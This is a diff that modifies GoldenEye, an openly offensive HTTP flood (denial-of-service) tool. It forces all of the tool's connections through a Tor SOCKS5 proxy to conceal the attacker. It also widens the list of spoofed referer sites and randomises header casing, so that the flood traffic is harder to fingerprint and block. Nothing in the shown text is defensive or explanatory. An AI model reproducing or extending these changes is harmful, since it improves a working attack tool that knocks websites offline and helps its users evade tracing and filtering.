@@ -40,9 +40,7 @@ THE AUTHOR DOES NOT TAKE ANY RESPONSIBILITY FOR IT.
 BY USING THIS SOFTWARE YOU AGREE WITH THESE TERMS.
 """
 
-from multiprocessing import Process, Manager, Pool
-import urlparse, ssl
-import sys, getopt, random, time, os
+from multiprocessing import Process, Manager, Pool; import urlparse, ssl, sys, getopt, random, time, os, socket, socks
 
 # Python version-specific 
 if  sys.version_info < (3,0):
@@ -72,6 +70,10 @@ DEFAULT_WORKERS=10
 DEFAULT_SOCKETS=500
 
 GOLDENEYE_BANNER = 'GoldenEye v2.1 by Jan Seidl <jseidl@wroot.org>'
+
+# Allows the use of Tor
+socks.set_default_proxy(socks.SOCKS5,"127.0.0.1", 9150)
+socket.socket = socks.socksocket
 
 USER_AGENT_PARTS = {
     'os': {
@@ -281,6 +283,11 @@ class Striker(Process):
             'http://www.bing.com/',
             'http://www.baidu.com/',
             'http://www.yandex.com/',
+            'http://www.google.co.uk/',
+            'http://www.facebook.com/',
+            'http://www.youtube.com/',
+            'http://www.yahoo.com/',
+            'http://www.google.ru/',
             'http://' + self.host + '/'
             ]
 
@@ -303,7 +310,7 @@ class Striker(Process):
             a = random.choice(validChars)
             out_str += chr(a)
 
-        return out_str
+        return(out_str)
 
 
     def run(self):
@@ -474,7 +481,7 @@ class Striker(Process):
             'User-Agent': self.getUserAgent(),
             'Cache-Control': noCache,
             'Accept-Encoding': ', '.join(roundEncodings),
-            'Connection': 'keep-alive',
+            'Connection': random.choice(['keep-alive', 'Keep-Alive']),
             'Keep-Alive': random.randint(1,1000),
             'Host': self.host,
         }
@@ -485,7 +492,7 @@ class Striker(Process):
         # header count random and unfingerprintable
         if random.randrange(2) == 0:
             # Random accept-charset
-            acceptCharset = [ 'ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15', ]
+            acceptCharset = [ 'ISO-8859-1', 'UTF-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15', ]
             random.shuffle(acceptCharset)
             http_headers['Accept-Charset'] = '{0},{1};q={2},*;q={3}'.format(acceptCharset[0], acceptCharset[1],round(random.random(), 1), round(random.random(), 1))
 
